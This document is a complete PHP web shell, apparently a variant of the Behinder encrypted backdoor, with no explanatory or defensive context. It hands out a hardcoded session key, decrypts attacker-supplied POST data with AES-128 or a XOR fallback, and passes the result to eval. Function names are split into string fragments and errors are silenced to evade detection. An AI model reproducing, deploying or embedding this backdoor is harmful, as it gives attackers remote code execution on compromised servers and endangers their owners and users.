<?php
@error_reporting(0);
session_start();
function encc(){
    return base64_encode("php://input");
}
function denc($str){
    return base64_decode($str);
}
 
if (isset($_GET['pass']))
{
    $key='e45e329feb5d925b';
    $_SESSION['k']=$key;
    print $key;
}
else
{   
    $key=$_SESSION['k'];
    $res='';
    $f="file_g"."et_conte"."nts";
    $fstr=denc(encc());
    $post=$f("".$fstr."");
    
    if(!extension_loaded('openssl'))
    {
        $t="base64_123"."decode";
        $t=str_replace("123","",$t);
        $post=denc($post."");
        
        for($i=0;$i<strlen($post);$i++) {
                $res=substr_replace($res,$post[$i]^$key[$i+1&15],$i,0);
                }
        $post=$res;
 
    }
    else
    {
        $o="ope"."nssl_"."decrypt";
        $post=$o($post, "AES128", $key);
 
    }
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
    class C{public function __construct($p) {eval($p."");}}
    @new C($params);
}
?>